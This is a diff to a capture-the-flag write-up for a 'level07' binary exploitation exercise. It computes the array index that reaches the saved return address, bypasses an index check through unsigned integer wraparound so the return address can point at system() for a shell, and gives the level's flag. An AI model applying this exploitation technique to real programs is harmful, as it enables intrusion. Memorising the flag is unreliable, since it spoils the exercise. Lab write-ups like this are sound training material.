@@ -61,36 +61,14 @@ Stack level 0, frame at 0xffffd720:
 (gdb) 
 ```
 
-```C
-(gdb) b main
-Breakpoint 1 at 0x8048729
-(gdb) r
-Starting program: /home/users/level07/level07 
+At the start of the array, we have address `0xffffd554` (4294956372 in decimal)
+The eip is at `0xffffd71c`(4294956828 in decimal)
 
-Breakpoint 1, 0x08048729 in main ()
-(gdb) info frame
-Stack level 0, frame at 0xffffd720:
- eip = 0x8048729 in main; saved eip 0xf7e45513
- Arglist at 0xffffd718, args: 
- Locals at 0xffffd718, Previous frame's sp is 0xffffd720
- Saved registers:
-  ebp at 0xffffd718, eip at 0xffffd71c
-(gdb) 
-```
+If we substract both value 4294956828 - 4294956372 = 456.
+Since the array is in unsigned int which is 4 bytes long, we have to divide 456 by 4 = 114.
+So whatever we input in index 114, will overwrite the EIP.
 
-Breakpoint 1, 0x08048636 in store_number ()
-(gdb) info frame
-Stack level 0, frame at 0xffffd530:
- eip = 0x8048636 in store_number; saved eip 0x80488ef
- called by frame at 0xffffd720
- Arglist at 0xffffd528, args: 
- Locals at 0xffffd528, Previous frame's sp is 0xffffd530
- Saved registers:
-  ebp at 0xffffd528, eip at 0xffffd52c
-(gdb)  x/wx $esp
-0xffffd500:	0x00000000
-(gdb) 
-
+Finding elements to spawn a shell :
 
 Addr of system():
 ```C
@@ -131,4 +109,18 @@ Mapped address spaces:
 1 pattern found. 
 ```
 
-114 % 2^30 --> 1073741938
+When we want to write to index 114, we get blocked by this code :
+```C
+    if ((index % 3 == 0) || ((value >> 24) == 0xb7)) {
+        puts(" *** ERROR! ***");
+        puts("   This index is reserved for wil!");
+        puts(" *** ERROR! ***");
+        ret = 1;
+```
+
+If we overflow the UINT_MAX : 4294967295 + 456
+then in int it will be divided by 4 : 1073741938
+
+We have all our elements to change eip address.
+
+flag = `7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC`
